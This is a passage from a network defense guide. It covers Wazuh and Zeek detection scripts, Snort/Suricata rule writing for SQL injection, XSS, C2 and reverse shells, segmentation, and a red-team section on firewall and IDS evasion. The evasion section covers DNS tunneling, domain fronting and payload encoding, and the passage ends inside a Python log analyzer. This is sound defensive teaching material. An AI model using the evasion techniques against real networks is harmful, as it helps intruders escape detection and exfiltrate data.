    </mitre>
    <group>lateral_movement,</group>
  </rule>

  <!-- Detect data exfiltration: large outbound transfer -->
  <rule id="100003" level="8">
    <if_sid>80700</if_sid>
    <field name="bytes_sent">^\d{7,}$</field>
    <description>Large outbound data transfer detected: $(bytes_sent) bytes</description>
    <mitre>
      <id>T1048</id>
    </mitre>
    <group>data_exfiltration,</group>
  </rule>

</group>
```

### 4.5 Zeek (Bro) — Network Analysis Framework

#### Log Types

Zeek generates structured logs for every protocol it observes:

| Log File | Content |
|----------|---------|
| `conn.log` | All connections (5-tuple, duration, bytes, state) |
| `http.log` | HTTP requests/responses (method, URI, headers, MIME) |
| `dns.log` | DNS queries and answers |
| `ssl.log` | TLS handshakes (JA3, certificate chain) |
| `files.log` | File transfers (hash, type, source) |
| `notice.log` | Alerts from Zeek's notice framework |
| `weird.log` | Protocol anomalies |
| `x509.log` | Certificate details |
| `smtp.log` | Email metadata |
| `pe.log` | Windows PE file details |
| `dpd.log` | Dynamic protocol detection events |

#### Zeek Script — Detect C2 Beaconing

```zeek
# c2_beacon_detection.zeek
# Detect periodic HTTP connections indicative of C2 beaconing

module C2Beacon;

export {
    redef enum Notice::Type += {
        C2_Beacon_Detected
    };

    # Minimum connections to trigger analysis
    const min_connections = 10 &redef;
    
    # Maximum allowed jitter coefficient (std_dev / mean)
    const max_jitter_coefficient = 0.15 &redef;
    
    # Minimum interval (seconds) to consider as beaconing
    const min_beacon_interval = 10.0 &redef;
    
    # Analysis window
    const analysis_window = 1hr &redef;
}

# Track connection timestamps per destination
global conn_times: table[addr, addr] of vector of time &create_expire=analysis_window;

event http_reply(c: connection, version: string, code: count, reason: string)
{
    local src = c$id$orig_h;
    local dst = c$id$resp_h;
    
    if ( [src, dst] !in conn_times )
        conn_times[src, dst] = vector();
    
    conn_times[src, dst] += network_time();
    
    # Analyze when we have enough data points
    if ( |conn_times[src, dst]| >= min_connections )
    {
        local times = conn_times[src, dst];
        local intervals: vector of double = vector();
        
        for ( i in times )
        {
            if ( i > 0 )
            {
                local delta = time_to_double(times[i]) - time_to_double(times[i-1]);
                if ( delta > 0.0 )
                    intervals += delta;
            }
        }
        
        if ( |intervals| < min_connections - 1 )
            next;
        
        # Calculate mean interval
        local sum = 0.0;
        for ( idx in intervals )
            sum += intervals[idx];
        local mean = sum / |intervals|;
        
        if ( mean < min_beacon_interval )
            next;
        
        # Calculate standard deviation
        local variance_sum = 0.0;
        for ( idx in intervals )
            variance_sum += (intervals[idx] - mean) * (intervals[idx] - mean);
        local std_dev = sqrt(variance_sum / |intervals|);
        
        # Jitter coefficient
        local jitter = std_dev / mean;
        
        if ( jitter < max_jitter_coefficient )
        {
            NOTICE([
                $note=C2_Beacon_Detected,
                $src=src,
                $dst=dst,
                $msg=fmt("Potential C2 beaconing: %s -> %s (interval=%.1fs, jitter=%.3f, samples=%d)",
                         src, dst, mean, jitter, |intervals|),
                $sub=fmt("mean_interval=%.1f std_dev=%.3f", mean, std_dev),
                $identifier=cat(src, dst)
            ]);
            
            # Reset to avoid repeated alerts
            delete conn_times[src, dst];
        }
    }
}
```

#### Zeek Script — JA3 Fingerprint Matching

```zeek
# ja3_threat_matching.zeek
# Match JA3 fingerprints against known malware C2

@load base/protocols/ssl

module JA3Threat;

export {
    redef enum Notice::Type += {
        Known_Malware_JA3
    };
}

# Known malicious JA3 hashes (updated from threat intel)
global malicious_ja3: set[string] = {
    "51c64c77e60f3980eea90869b68c58a8",  # Emotet
    "4d7a28d6f2263ed61de88ca66eb011e3",  # TrickBot
    "72a589da586844d7f0818ce684948eea",  # Cobalt Strike default
    "a0e9f5d64349fb13191bc781f81f42e1",  # Metasploit Meterpreter
    "e7d705a3286e19ea42f587b344ee6865",  # AsyncRAT
};

event ssl_client_hello(c: connection, version: count, record_version: count,
                       possible_ts: time, client_random: string, session_id: string,
                       ciphers: index_vec, comp_methods: index_vec)
{
    # JA3 is computed by Zeek and stored in the SSL log
    # We check it in ssl_established when the hash is available
}

event ssl_established(c: connection)
{
    if ( ! c$ssl?$ja3 )
        return;
    
    if ( c$ssl$ja3 in malicious_ja3 )
    {
        NOTICE([
            $note=Known_Malware_JA3,
            $conn=c,
            $msg=fmt("Connection with known malware JA3 fingerprint: %s -> %s:%d (JA3: %s)",
                     c$id$orig_h, c$id$resp_h, c$id$resp_p, c$ssl$ja3),
            $sub=c$ssl$ja3,
            $identifier=cat(c$id$orig_h, c$ssl$ja3)
        ]);
    }
}
```

### 4.6 Detection Methodologies

| Method | How It Works | Strengths | Weaknesses |
|--------|-------------|-----------|------------|
| **Signature** | Pattern matching against known attack strings | Low false positives, fast | Cannot detect zero-days |
| **Anomaly** | Baseline normal behavior, alert on deviation | Detects unknown attacks | High false positives during tuning |
| **Behavioral** | Model expected behavior of entities (users, hosts) | Detects insider threats, APT | Requires learning period, expensive |
| **Hybrid** | Combine signature + anomaly + behavioral | Best coverage | Complexity in correlation |

---

## 5. Intrusion Prevention Systems

### 5.1 Inline vs Passive Deployment

**Inline (IPS mode):**
- Device sits directly in the traffic path
- Can actively block, reset, or modify packets
- Failure modes matter: fail-open (traffic passes uninspected) vs fail-close (traffic drops)
- Latency added: typically 50-200 microseconds for dedicated hardware

**Passive (IDS mode):**
- Receives traffic copy via SPAN/TAP
- Can only alert, not prevent
- No impact on traffic flow
- Used when inline risk is unacceptable (critical OT networks)

### 5.2 Fail-Open vs Fail-Close

| Mode | Behavior on Failure | Use Case |
|------|-------------------|----------|
| Fail-open | Traffic bypasses IPS | Production environments where availability > security |
| Fail-close | Traffic is dropped | High-security environments (government, financial) |
| Hardware bypass | Network tap with relay that shorts on power loss | Physical fail-open for appliances |

**Best practice:** Use hardware bypass NICs (with relay) in production. Configure fail-open at the DAQ level. Monitor bypass state as a critical alert.

### 5.3 Performance Considerations

#### Throughput vs Inspection Depth

```
Raw throughput (no inspection):     100 Gbps
With L3/L4 stateful tracking:       80 Gbps  (-20%)
With app identification:            50 Gbps  (-50%)
With full IPS signatures:           30 Gbps  (-70%)
With SSL decryption + IPS:          15 Gbps  (-85%)
With sandboxing + all features:     10 Gbps  (-90%)
```

These numbers are typical for a high-end NGFW appliance. The lesson: enable only what you need per zone.

#### Latency Budget

| Deployment | Acceptable Latency |
|------------|-------------------|
| Data center east-west | < 100 μs |
| Perimeter (standard) | < 500 μs |
| Remote office | < 2 ms |
| User-facing (CASB proxy) | < 50 ms |

### 5.4 Bypass Techniques Attackers Use

#### Fragmentation Attacks

- **IP fragmentation:** Split payload across fragments so no single fragment contains the full signature
- **TCP segmentation:** Send tiny TCP segments (1-2 bytes) to evade pattern matching
- **Overlapping fragments:** Different IPS implementations reassemble overlapping fragments differently (favoring first or last fragment)

#### Encoding Evasion

- URL encoding: `/etc/passwd` → `%2Fetc%2Fpasswd`
- Double encoding: `%252Fetc%252Fpasswd`
- Unicode encoding: various UTF-8 representations
- NULL byte injection: `file.php%00.jpg`
- Mixed case: `SeLeCt` vs `SELECT` for SQL injection

#### Timing-Based Evasion

- **Slow-rate attacks:** Send one byte per second — below IPS timeout thresholds
- **Session splicing:** Split attack across multiple TCP segments with long delays
- **Idle timeout exploitation:** Keep session alive with keepalive but below detection thresholds

#### Protocol-Level Evasion

- **TTL manipulation:** Packets with low TTL reach IPS (which matches them) but expire before reaching the target — IPS thinks the attack succeeded, target never sees it. Then resend with higher TTL containing benign content. IPS confused.
- **TCP RST injection:** Send RST to desynchronize IPS state tracking
- **HTTP request smuggling:** Ambiguous Content-Length vs Transfer-Encoding

### 5.5 Tuning for False Positive Reduction

1. **Baseline period:** Run in IDS mode for 2-4 weeks before enabling prevention
2. **Categorize alerts:** Group by source, destination, rule SID, frequency
3. **Suppress high-volume false positives:**
   ```
   suppress gen_id 1, sig_id 2100498, track by_src, ip 10.0.1.50
   ```
4. **Threshold repetitive alerts:**
   ```
   event_filter gen_id 1, sig_id 2024897, type limit, track by_src, count 1, seconds 60
   ```
5. **Disable rules irrelevant to your environment:** IIS attack rules on an all-Linux environment
6. **Custom pass rules:** Whitelist known-good traffic patterns
7. **Regular review cadence:** Weekly top-10 false positive review, monthly rule audit

---

## 6. Rule Engineering e Detection

### 6.1 Snort/Suricata Rule Syntax Deep Dive

#### Rule Structure

```
action protocol src_addr src_port direction dst_addr dst_port (options;)
```

**Actions:**
- `alert` — generate alert
- `pass` — ignore (whitelist)
- `drop` — block and log (inline only)
- `reject` — block and send RST/ICMP unreachable
- `rejectsrc` — RST to source only
- `rejectdst` — RST to destination only
- `rejectboth` — RST to both

#### Content Matching

```
# Basic content match
content:"GET /admin"; nocase;

# Content with offset and depth (performance optimization)
content:"|0d 0a|Host:"; offset:0; depth:100;

# Negated content
content:!"Authorization"; within:200;

# Multiple content matches (AND logic)
content:"cmd.exe"; content:"/c"; distance:0; within:10;
```

**Modifiers:**
- `offset` — start searching N bytes into payload
- `depth` — search only first N bytes from offset
- `distance` — start N bytes after previous match
- `within` — find within N bytes after previous match
- `nocase` — case-insensitive
- `fast_pattern` — designate this content for the multi-pattern matcher (MPM)

#### PCRE (Perl Compatible Regular Expressions)

```
# Match SQL injection patterns
pcre:"/(\%27)|(\')|(\-\-)|(\%23)|(#)/i";

# Match base64-encoded commands
pcre:"/[A-Za-z0-9+\/]{50,}={0,2}/";

# Match obfuscated PowerShell
pcre:"/(?:powershell|pwsh)[\s\S]*?(?:-e(?:nc)?|-(?:encoded)?c(?:ommand)?)\s+[A-Za-z0-9+\/=]{20,}/i";
```

**Performance note:** PCRE is significantly slower than content matches. Always place a `content` match before PCRE to reduce the number of packets that reach the regex engine.

#### Flowbits

Flowbits enable multi-stage detection — tracking state across packets in a flow:

```
# Stage 1: Detect login page access
alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS ( \
    msg:"LOGIN-PAGE-ACCESS"; \
    content:"POST"; http_method; \
    content:"/login"; http_uri; \
    flowbits:set,login_attempt; \
    flowbits:noalert; \
    sid:4000001; rev:1;)

# Stage 2: Detect failed login (must have seen stage 1 first)
alert http $HOME_NET $HTTP_PORTS -> $EXTERNAL_NET any ( \
    msg:"LOGIN-FAILED"; \
    content:"401"; http_stat_code; \
    flowbits:isset,login_attempt; \
    flowbits:set,login_failed; \
    flowbits:noalert; \
    sid:4000002; rev:1;)

# Stage 3: Detect successful login after failures (credential stuffing)
alert http $HOME_NET $HTTP_PORTS -> $EXTERNAL_NET any ( \
    msg:"POSSIBLE-CREDENTIAL-STUFFING - Success after failures"; \
    content:"200"; http_stat_code; \
    flowbits:isset,login_failed; \
    classtype:successful-recon-limited; \
    sid:4000003; rev:1;)
```

#### Thresholds and Suppression

```
# Alert once per source every 60 seconds (rate limiting)
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 ( \
    msg:"SSH connection attempt"; \
    flow:to_server,established; \
    threshold:type limit, track by_src, count 1, seconds 60; \
    sid:5000001; rev:1;)

# Alert only after 10 occurrences in 30 seconds (threshold)
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS ( \
    msg:"HTTP Brute Force Detected"; \
    flow:to_server,established; \
    content:"POST"; http_method; \
    content:"/api/auth"; http_uri; \
    threshold:type threshold, track by_src, count 10, seconds 30; \
    classtype:attempted-dos; \
    sid:5000002; rev:1;)

# Suppress for known scanner
suppress gen_id 1, sig_id 5000001, track by_src, ip 10.0.5.100
```

### 6.2 Writing Rules for Specific Attacks

#### SQL Injection Detection

```
# Generic SQL injection in URI
alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS ( \
    msg:"SQL Injection Attempt in URI"; \
    flow:to_server,established; \
    content:"SELECT"; nocase; http_uri; \
    pcre:"/(?:SELECT|UNION|INSERT|UPDATE|DELETE|DROP|ALTER)\s+.*(?:FROM|INTO|TABLE|WHERE|SET)/Ui"; \
    classtype:web-application-attack; \
    reference:cwe,89; \
    sid:6000001; rev:3;)

# SQL injection via UNION-based technique
alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS ( \
    msg:"UNION-based SQL Injection"; \
    flow:to_server,established; \
    content:"UNION"; nocase; http_uri; \
    content:"SELECT"; nocase; distance:0; within:30; \
    pcre:"/UNION\s+(ALL\s+)?SELECT\s+/Ui"; \
    classtype:web-application-attack; \
    reference:cwe,89; \
    sid:6000002; rev:2;)

# Boolean-based blind SQL injection
alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS ( \
    msg:"Blind SQL Injection - Boolean-based"; \
    flow:to_server,established; \
    content:"AND"; nocase; http_uri; \
    pcre:"/(?:AND|OR)\s+\d+=\d+/Ui"; \
    pcre:"/(?:AND|OR)\s+(?:\'[^\']+\'=\'[^\']+\'|\d+=\d+|true|false)/Ui"; \
    classtype:web-application-attack; \
    reference:cwe,89; \
    sid:6000003; rev:2;)

# Time-based blind SQL injection
alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS ( \
    msg:"Time-based Blind SQL Injection"; \
    flow:to_server,established; \
    pcre:"/(SLEEP|WAITFOR\s+DELAY|BENCHMARK|pg_sleep)\s*\(/Ui"; \
    classtype:web-application-attack; \
    reference:cwe,89; \
    sid:6000004; rev:1;)
```

#### Cross-Site Scripting (XSS) Detection

```
# Reflected XSS - script tag in URI
alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS ( \
    msg:"XSS Attempt - Script Tag in URI"; \
    flow:to_server,established; \
    content:"<script"; nocase; http_uri; \
    classtype:web-application-attack; \
    reference:cwe,79; \
    sid:6000010; rev:2;)

# XSS via event handlers
alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS ( \
    msg:"XSS Attempt - Event Handler in Parameter"; \
    flow:to_server,established; \
    pcre:"/(?:on(?:mouse|click|load|error|focus|blur|key|submit|change)\s*=)/Ui"; \
    classtype:web-application-attack; \
    reference:cwe,79; \
    sid:6000011; rev:2;)

# XSS via javascript: protocol
alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS ( \
    msg:"XSS Attempt - javascript: Protocol"; \
    flow:to_server,established; \
    content:"javascript"; nocase; http_uri; \
    content:":"; distance:0; within:5; \
    classtype:web-application-attack; \
    reference:cwe,79; \
    sid:6000012; rev:1;)
```

#### Command & Control Detection

```
# Cobalt Strike default beacon
alert http $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"Cobalt Strike Beacon - Default Profile"; \
    flow:to_server,established; \
    content:"GET"; http_method; \
    content:"/pixel.gif"; http_uri; \
    content:"Cookie:"; http_header; \
    pcre:"/Cookie:\s*[A-Za-z0-9+\/]{60,}={0,2}/H"; \
    classtype:trojan-activity; \
    reference:url,blog.cobaltstrike.com; \
    sid:6000020; rev:3;)

# Generic C2 beacon - periodic short HTTP requests
alert http $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"Possible C2 Beacon - Short Periodic Requests"; \
    flow:to_server,established; \
    dsize:<200; \
    content:"GET"; http_method; \
    threshold:type threshold, track by_src, count 20, seconds 300; \
    classtype:trojan-activity; \
    sid:6000021; rev:1;)

# DNS-based C2 - long TXT queries
alert dns $HOME_NET any -> any 53 ( \
    msg:"Possible DNS C2 - Long TXT Query"; \
    dns.query; content:"."; \
    pcre:"/[a-z0-9]{30,}\.[a-z]{2,10}\.[a-z]{2,6}$/"; \
    threshold:type threshold, track by_src, count 5, seconds 60; \
    classtype:trojan-activity; \
    sid:6000022; rev:2;)

# Reverse shell detection (bash -i)
alert tcp $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"Possible Reverse Shell - bash Interactive"; \
    flow:established; \
    content:"/bin/bash"; \
    content:"-i"; distance:0; within:10; \
    classtype:trojan-activity; \
    sid:6000025; rev:1;)
```

#### Exploit Kit Detection

```
# Landing page redirect chain (common in exploit kits)
alert http $HOME_NET any -> $EXTERNAL_NET any ( \
    msg:"Exploit Kit - Redirect Chain (multiple 302s)"; \
    flow:to_client,established; \
    content:"302"; http_stat_code; \
    content:"Location:"; http_header; \
    pcre:"/Location:\s*https?:\/\/[a-z0-9]{8,30}\./Hi"; \
    threshold:type threshold, track by_src, count 3, seconds 10; \
    classtype:trojan-activity; \
    sid:6000030; rev:1;)

# Exploit kit - obfuscated JavaScript payload
alert http $EXTERNAL_NET any -> $HOME_NET any ( \
    msg:"Exploit Kit - Obfuscated JS Delivery"; \
    flow:to_client,established; \
    content:"Content-Type: application/javascript"; http_header; \
    content:"eval("; \
    content:"String.fromCharCode"; distance:0; within:100; \
    classtype:trojan-activity; \
    sid:6000031; rev:2;)
```

### 6.3 Rule Performance Optimization

#### Content Before PCRE

```
# BAD: PCRE runs on every packet to HTTP ports
alert http any any -> any any (pcre:"/malicious_pattern/"; sid:9999;)

# GOOD: Content pre-filter reduces PCRE invocations by 99%+
alert http any any -> any any ( \
    content:"malicious"; fast_pattern; \
    pcre:"/malicious_pattern/"; \
    sid:9999;)
```

#### fast_pattern Designation

The `fast_pattern` keyword tells the multi-pattern matcher (Aho-Corasick engine) which content to use for initial filtering. Choose the most unique/longest string:

```
alert http any any -> any any ( \
    content:"User-Agent:"; http_header;        # common, bad for fast_pattern
    content:"X-Custom-Beacon"; fast_pattern;   # rare, excellent filter
    sid:7000001;)
```

#### Ruleset Comparison

| Ruleset | Rules Count | Update Frequency | License | Best For |
|---------|------------|-----------------|---------|----------|
| ET Open | ~40,000 | Daily | BSD | Community, budget environments |
| ET Pro | ~60,000+ | Multiple daily | Commercial | Enterprise IDS/IPS |
| Snort Community | ~3,500 | Periodic | GPLv2 | Basic detection |
| Snort Subscriber (Talos) | ~30,000+ | Multiple daily | Commercial | Cisco/Snort shops |

**Recommendation:** Use ET Pro as primary ruleset, supplement with custom rules for your specific environment. Disable categories irrelevant to your infrastructure.

---

## 7. Network Segmentation Strategy

### 7.1 Micro-Segmentation vs Macro-Segmentation

**Macro-segmentation:** Traditional zone-based approach. Segments = VLANs/subnets with firewall rules between them. Effective for north-south control but limited for east-west.

**Micro-segmentation:** Per-workload policy enforcement. Each VM, container, or host has its own security policy. Traffic between two web servers in the same subnet is inspected and controlled.

| Aspect | Macro | Micro |
|--------|-------|-------|
| Granularity | Subnet/VLAN | Individual workload |
| East-west control | Limited | Full |
| Implementation | Network firewalls | Host-based/SDN agents |
| Complexity | Low | High |
| Lateral movement prevention | Partial | Strong |

### 7.2 Zero-Trust Network Architecture (ZTNA)

Core principles:

1. **Never trust, always verify** — no implicit trust based on network location
2. **Least-privilege access** — minimal access required for the task
3. **Assume breach** — design as if the perimeter is already compromised
4. **Verify explicitly** — authenticate and authorize every access request
5. **Inspect and log everything** — full visibility regardless of encryption

**ZTNA implementation layers:**

```
┌─────────────────────────────────────────────────────────────┐
│                    Identity Provider (IdP)                    │
│              (Azure AD, Okta, Google Workspace)               │
└────────────────────────────┬────────────────────────────────┘
                             │
┌────────────────────────────▼────────────────────────────────┐
│                    Policy Engine (PDP)                        │
│         (evaluate device posture + user identity +           │
│          requested resource + context → permit/deny)         │
└────────────────────────────┬────────────────────────────────┘
                             │
┌────────────────────────────▼────────────────────────────────┐
│                 Policy Enforcement Points (PEP)               │
│     (ZTNA gateway, SDP controller, identity-aware proxy)     │
└────────────────────────────┬────────────────────────────────┘
                             │
┌────────────────────────────▼────────────────────────────────┐
│                     Protected Resources                       │
│        (applications, databases, services, APIs)              │
└─────────────────────────────────────────────────────────────┘
```

### 7.3 East-West vs North-South Traffic Control

**North-south:** Traffic crossing the perimeter (Internet ↔ internal). Traditional firewall territory.

**East-west:** Traffic between internal systems. This is where lateral movement happens. In modern data centers, east-west traffic is 80%+ of total volume but often has minimal security controls.

**Strategies for east-west control:**

- Distributed firewalls (VMware NSX-T DFW, Cilium, Calico)
- Service mesh (Istio, Linkerd) with mTLS between microservices
- Host-based firewalls (Windows Firewall GPO, iptables/nftables)
- Network access control lists per-switch-port

### 7.4 VLAN-Based Segmentation Limitations

VLANs provide Layer 2 isolation but have significant security gaps:

- **VLAN hopping:** 802.1Q double-tagging attack, switch spoofing
- **No intra-VLAN filtering:** Devices in the same VLAN communicate freely
- **Flat trust within VLAN:** A compromised host can attack all peers
- **Management overhead:** VLAN sprawl in large environments
- **No identity awareness:** IP-based rules, not user/device-based

VLANs are necessary but insufficient. Layer additional controls on top.

### 7.5 SDN-Based Segmentation

#### VMware NSX-T

- Distributed Firewall (DFW) runs in the hypervisor kernel
- Per-VM granularity without hairpinning traffic through a physical firewall
- Tag-based policies: label VMs with security tags, policies follow the VM across hosts
- Context-aware: uses guest OS introspection for process-level visibility

#### Cisco ACI (Application Centric Infrastructure)

- **Endpoint Groups (EPG):** Logical groupings of endpoints by function
- **Contracts:** Policies defining allowed communication between EPGs
- **Application Network Profiles (ANP):** Multi-tier application definitions
- Infrastructure enforces policy at the leaf switch level

### 7.6 Identity-Based Segmentation

Instead of IP-based rules, policies reference identity:

```
Rule: Allow [Identity: "Finance-Users"] → [App: "ERP-System"] → [Action: Read]
Rule: Allow [Identity: "IT-Admins"] → [App: "All-Servers"] → [Action: SSH]
Rule: Deny  [Identity: "Contractors"] → [App: "Internal-Wiki"] → [Action: Write]
```

Identity sources: Active Directory groups, certificates, 802.1X RADIUS attributes, cloud IAM roles.

---

## 8. Evasione e Bypass — Red Team Perspective

### 8.1 Firewall Bypass Techniques

#### DNS Tunneling

Encapsulate arbitrary data within DNS queries/responses. Works because DNS (UDP/53) is almost never blocked.

**Tools:** `iodine`, `dnscat2`, `dns2tcp`

**How it works:**

1. Attacker controls authoritative DNS for `evil.example.com`
2. Compromised host encodes data into subdomain labels: `dGhpcyBpcyBzZWNyZXQ.evil.example.com`
3. Corporate DNS resolver forwards query to attacker's authoritative server
4. Response (TXT, CNAME, NULL records) carries return payload

**Detection indicators:**
- Unusually long domain names (>50 chars)
- High entropy in subdomain labels
- Excessive DNS queries to a single domain
- Unusual record types (NULL, TXT with binary data)
- Query volume anomalies from single hosts

#### HTTPS Tunneling

Encapsulate traffic within legitimate HTTPS connections:

- **HTTP CONNECT proxying:** Use corporate proxy CONNECT method to establish tunnel
- **WebSocket tunneling:** Upgrade HTTP to WebSocket, then send arbitrary binary
- **Chisel/Ligolo:** Reverse SOCKS proxy over HTTPS to C2

**Why it works:** HTTPS is generally permitted outbound. Without TLS inspection, the firewall sees only the TLS handshake (SNI) and encrypted payload.

#### ICMP Tunneling

Encapsulate data in ICMP echo request/reply payloads:

**Tools:** `ptunnel`, `icmpsh`, `hans`

```
Normal ping:  ICMP Echo Request → 56 bytes of padding data
Tunnel ping:  ICMP Echo Request → 56+ bytes of encoded C2 traffic
```

**Detection:** Monitor ICMP payload sizes. Normal pings have consistent, small payloads. Tunneled ICMP shows variable, large payloads and high frequency.

#### Domain Fronting

Abuse CDN infrastructure to hide the true destination:

1. TLS Client Hello SNI: `legitimate.cdn.net` (firewall sees this)
2. HTTP Host header (inside encrypted TLS): `evil-c2.cdn.net`
3. CDN routes based on Host header to the attacker's origin

The firewall sees a connection to a legitimate CDN domain. The actual traffic goes to the attacker's server behind the same CDN.

**Mitigation:** TLS inspection reveals the Host header mismatch. Some CDNs have disabled domain fronting.

#### Protocol Confusion

Tunnel non-HTTP protocols inside HTTP:
- HTTP/2 multiplexing to carry arbitrary streams
- gRPC (HTTP/2-based) for C2 communication
- MSSQL over HTTP (SQL Server feature)
- SSH over HTTPS (using `corkscrew` or similar)

### 8.2 IDS Evasion Techniques

#### Polymorphic Shellcode

Self-modifying code that decrypts itself at runtime. Each instance looks different:

```
# Concept: XOR-encoded shellcode with random key
# Each generation produces different bytes
Stage 1 (decoder stub): XOR key + decryption loop (changes each time)
Stage 2 (payload):      Encrypted with current key (different bytes each time)
```

IDS sees different byte patterns every time — signature matching fails.

**Detection approach:** Look for NOP sleds, decoder stub patterns (GetPC techniques), or behavioral indicators rather than specific byte sequences.

#### Encoding Payloads

Multiple encoding layers to bypass content inspection:

```
Original:     /etc/passwd
URL encode:   %2Fetc%2Fpasswd
Double encode: %252Fetc%252Fpasswd
Unicode:      /etc/passwd
Hex:          /etc/\x70asswd
Overlong UTF-8: /etc/p%c0%e1sswd
```

#### Slow-Rate Attacks

Stay below detection thresholds:

- **Slowloris:** Open connections, send partial headers slowly, never complete
- **Slow POST:** Send POST with Content-Length:100000, transmit 1 byte/second
- **Low-and-slow brute force:** One attempt per minute, rotated source IPs

IDS thresholds (e.g., "10 events in 60 seconds") never trigger.

#### Encrypted Channels

Using encrypted protocols that the IDS cannot inspect:

- SSH tunnels (all traffic opaque)
- WireGuard/OpenVPN to external endpoints
- TLS 1.3 with encrypted SNI (ESNI/ECH)
- Tor (onion routing, all traffic encrypted between relays)

**Detection without decryption:**
- JA3/JA3S fingerprinting (TLS client/server hello patterns)
- Certificate anomalies (self-signed, unusual validity periods, mismatched fields)
- Statistical analysis (packet sizes, timing, flow duration)
- Destination reputation (known Tor exit nodes, suspicious ASNs)

#### Living Off the Land

Use protocols and services already permitted:

- PowerShell Remoting (WinRM) over HTTP/HTTPS
- WMI for remote command execution
- Microsoft Graph API for C2 (OneDrive, SharePoint as dead drops)
- Slack/Teams webhooks for exfiltration
- Cloud storage APIs (S3, GCS) for staging

These blend perfectly with legitimate traffic. Detection requires behavioral analysis, not signature matching.

---

## 9. Monitoraggio e Tuning Operativo

### 9.1 Firewall Log Analysis

#### Key Log Fields to Monitor

| Field | Alert Condition |
|-------|-----------------|
| Action = Deny | Expected (implicit deny). Alert on deny from internal to internal |
| Source zone = DMZ, Dest zone = INSIDE | Should never happen — potential compromise |
| Bytes transferred (single session) | > 1GB outbound to single external IP |
| Session duration | > 24 hours for non-VPN protocols |
| Destination port | Unusual ports (4444, 5555, 8888) from internal hosts |
| Application = Unknown | High-risk — investigate immediately |
| Threat severity = Critical | Requires SOC response within 15 min |

#### Python Script for Log Analysis

```python
#!/usr/bin/env python3
"""
firewall_log_analyzer.py
Analyze firewall logs for anomalies, policy violations, and potential threats.
Expects input in CSV format (common export from Palo Alto, FortiGate, pfSense).
"""

import csv
import sys
import json
from collections import defaultdict, Counter
from datetime import datetime, timedelta
from ipaddress import ip_address, ip_network
from pathlib import Path
from typing import NamedTuple


class FirewallEvent(NamedTuple):
    timestamp: datetime
    src_ip: str
    dst_ip: str
    src_port: int
    dst_port: int
    protocol: str
    action: str
    bytes_sent: int
    bytes_recv: int
    application: str
    src_zone: str
    dst_zone: str


INTERNAL_NETS = [
    ip_network("10.0.0.0/8"),
    ip_network("172.16.0.0/12"),
    ip_network("192.168.0.0/16"),
]

SUSPICIOUS_PORTS = {4444, 5555, 6666, 8888, 9999, 1234, 31337, 12345}
C2_INDICATORS_THRESHOLD = 20  # connections to same dest in analysis window
EXFIL_THRESHOLD_BYTES = 500_000_000  # 500MB


def is_internal(addr: str) -> bool:
    try:
        ip = ip_address(addr)
        return any(ip in net for net in INTERNAL_NETS)
    except ValueError:
        return False


def parse_log(filepath: str) -> list[FirewallEvent]:
    events = []
    with open(filepath, "r", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        for row in reader:
            try:
                event = FirewallEvent(
                    timestamp=datetime.fromisoformat(row["timestamp"]),
                    src_ip=row["src_ip"],
                    dst_ip=row["dst_ip"],
                    src_port=int(row.get("src_port", 0)),
                    dst_port=int(row.get("dst_port", 0)),
                    protocol=row.get("protocol", "unknown"),
                    action=row.get("action", "unknown"),
                    bytes_sent=int(row.get("bytes_sent", 0)),
                    bytes_recv=int(row.get("bytes_recv", 0)),
                    application=row.get("application", "unknown"),
                    src_zone=row.get("src_zone", "unknown"),
                    dst_zone=row.get("dst_zone", "unknown"),
                )
                events.append(event)
            except (ValueError, KeyError):
                continue
    return events


def detect_lateral_movement(events: list[FirewallEvent]) -> list[dict]:
    """Detect internal-to-internal denied traffic (potential lateral movement)."""
    findings = []
    internal_denies = defaultdict(list)

    for e in events:
        if e.action.lower() == "deny" and is_internal(e.src_ip) and is_internal(e.dst_ip):
            internal_denies[e.src_ip].append(e)

    for src, denied_events in internal_denies.items():
        unique_dests = {e.dst_ip for e in denied_events}
        if len(unique_dests) >= 5:
            findings.append({
                "type": "lateral_movement_attempt",
                "severity": "HIGH",
                "source": src,
                "unique_destinations": len(unique_dests),
                "total_attempts": len(denied_events),
                "destinations": sorted(unique_dests)[:20],
                "first_seen": min(e.timestamp for e in denied_events).isoformat(),
                "last_seen": max(e.timestamp for e in denied_events).isoformat(),
            })

    return findings


def detect_beaconing(events: list[FirewallEvent], window_minutes: int = 60) -> list[dict]:
    """Detect periodic connections to external hosts (C2 beaconing)."""
    findings = []
    outbound = defaultdict(list)

    for e in events:
        if is_internal(e.src_ip) and not is_internal(e.dst_ip) and e.action.lower() == "allow":
            outbound[(e.src_ip, e.dst_ip)].append(e.timestamp)

    for (src, dst), timestamps in outbound.items():
        if len(timestamps) < C2_INDICATORS_THRESHOLD:
            continue

        timestamps.sort()
        intervals = [
            (timestamps[i + 1] - timestamps[i]).total_seconds()
            for i in range(len(timestamps) - 1)
        ]

        if not intervals:
            continue

        mean_interval = sum(intervals) / len(intervals)
        if mean_interval < 5:  # Too frequent, likely normal app traffic
            continue

        variance = sum((x - mean_interval) ** 2 for x in intervals) / len(intervals)
        std_dev = variance ** 0.5
        jitter = std_dev / mean_interval if mean_interval > 0 else 1.0

        if jitter < 0.2 and mean_interval > 10:
            findings.append({
                "type": "c2_beaconing",
                "severity": "CRITICAL",
                "source": src,
                "destination": dst,
                "mean_interval_seconds": round(mean_interval, 1),
                "jitter_coefficient": round(jitter, 4),
                "connection_count": len(timestamps),
                "first_seen": timestamps[0].isoformat(),
                "last_seen": timestamps[-1].isoformat(),
            })

    return findings


def detect_data_exfiltration(events: list[FirewallEvent]) -> list[dict]:
    """Detect large outbound data transfers."""
    findings = []
    outbound_bytes = defaultdict(int)

    for e in events:
        if is_internal(e.src_ip) and not is_internal(e.dst_ip):
